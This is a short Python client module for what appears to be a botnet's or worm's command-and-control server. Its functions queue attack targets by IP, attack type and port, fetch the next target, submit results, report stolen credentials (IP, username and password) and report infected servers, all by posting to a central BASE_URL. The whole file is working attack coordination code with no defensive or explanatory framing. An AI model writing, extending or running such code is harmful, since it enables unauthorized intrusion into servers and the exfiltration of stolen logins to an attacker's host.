from client_v2 import BASE_URL
import requests

def add_target(ip, attack_type, port=None, priority=1):
    url = f"{BASE_URL}/add_target"
    data = {"ip": ip, "type": attack_type, "port": port, "priority": priority}
    response = requests.post(url, json=data)
    return response.json()


def submit_results(data):
    url = f"{BASE_URL}/submit_results"
    response = requests.post(url, json=data)
    return response.json()


def get_target():
    url = f"{BASE_URL}/get_target"
    response = requests.get(url)
    return response.json()


def notify_credentials_found(ip, username, password):
    url = f"{BASE_URL}/notify_credentials_found"
    data = {"credentials": {"ip": ip, "username": username, "password": password}}
    response = requests.post(url, json=data)
    return response.json()


def notify_infected_server(ip_address):
    url = f"{BASE_URL}/notify_infected_server"
    data = {"ip_address": ip_address}
    response = requests.post(url, json=data)
    return response.json()
